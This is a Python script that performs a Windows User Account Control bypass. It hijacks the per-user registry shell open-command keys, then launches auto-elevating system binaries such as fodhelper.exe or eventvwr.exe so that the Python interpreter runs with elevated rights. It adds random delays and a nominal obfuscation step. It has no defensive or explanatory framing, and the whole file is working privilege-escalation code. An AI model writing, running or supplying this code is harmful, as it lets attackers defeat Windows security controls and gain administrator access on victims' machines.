import os
import sys
import subprocess
import time
import random
import logging

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

def obfuscate_command(command):
    parts = command.split(" ")
    return " ".join(parts)

def bypass_uac():
    methods = [
        ("fodhelper.exe", 'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "" /t REG_SZ /d "{}" /f'),
        ("eventvwr.exe", 'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /v "" /t REG_SZ /d "{}" /f'),
        ("sdclt.exe", 'reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /v "" /t REG_SZ /d "{}" /f'),
        ("ComputerDefaults.exe", 'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "" /t REG_SZ /d "{}" /f'),
    ]

    executable, reg_command_template = random.choice(methods)

    try:
        executable_path = os.path.join(os.getenv("SystemRoot"), "System32", executable)
        reg_command = reg_command_template.format(os.path.abspath(sys.executable))

        time.sleep(random.randint(1, 5))

        obfuscated_reg_command = obfuscate_command(reg_command)
        subprocess.run(obfuscated_reg_command, shell=True, check=True)
        logging.info(f"[INFO] Registry command executed (obfuscated): {obfuscated_reg_command}")

        time.sleep(random.randint(1, 5))

        subprocess.run(executable_path, shell=True, check=True)
        logging.info(f"[INFO] UAC bypass successful using {executable}.")
        return
    except Exception as e:
        logging.error(f"[ERROR] UAC bypass with {executable} failed: {e}")

    logging.error("[ERROR] All UAC bypass methods failed.")